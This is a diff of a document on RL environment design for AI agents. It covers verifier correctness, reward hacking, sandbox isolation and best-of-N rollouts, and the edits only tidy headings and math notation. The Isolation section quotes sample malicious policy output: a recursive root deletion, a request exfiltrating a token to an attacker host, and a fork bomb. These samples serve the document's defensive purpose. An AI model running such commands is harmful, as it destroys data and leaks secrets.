@@ -87,7 +87,7 @@ Industrial Practice: **Write the eval first, then turn it into an RL environment
 
 The Verifier $\mathcal{V}$ is the soul of the RL environment. A poor Verifier can lead the policy to learn behaviors that "maximize reward but fail the task" (reward hacking). Verifier design follows four principles:
 
-### Correctness (Correctness)
+### Correctness
 
 The Verifier must accurately determine whether "the task has been truly completed." Ideally, $\mathcal{V}$ is a **deterministic** function — given the same trajectory, it always produces the same result. This avoids introducing variance. There are two sources of correctness:
 
@@ -173,7 +173,7 @@ flowchart TB
 
 The core of the environment for agent tasks is the **sandbox** — an isolated execution environment where the policy reads and writes files, executes code, and calls tools. Sandbox engineering must address three key issues:
 
-### Isolation (Isolation)
+### Isolation
 
 The code output by the policy may be malicious — such as `os.system("rm -rf /")`, `requests.get("attacker.com/exfil?token=...")`, or a fork bomb. The sandbox must ensure:
 
@@ -388,7 +388,7 @@ This pattern ensures that the agent's progress is not undone, promoting a contin
 
 Karpathy proposed a practical pattern in 2025: **for long-range tasks, launch 5–6 agent instances in parallel to tackle the problem simultaneously**, and select the first one to complete as the answer.
 
-Formally: Use $ N $ agent instances $ \pi*\theta^{(1)}, \ldots, \pi*\theta^{(N)} $, each independently rollout, and finally choose the one with the highest verifier score:
+Formally, run $N$ independent agent instances $\pi_\theta^{(1)},\ldots,\pi_\theta^{(N)}$ and select the trajectory with the highest verifier score:
 
 $$
 \tau^* = \arg\max_{\tau^{(i)}, i=1..N} \mathcal{V}(\tau^{(i)})
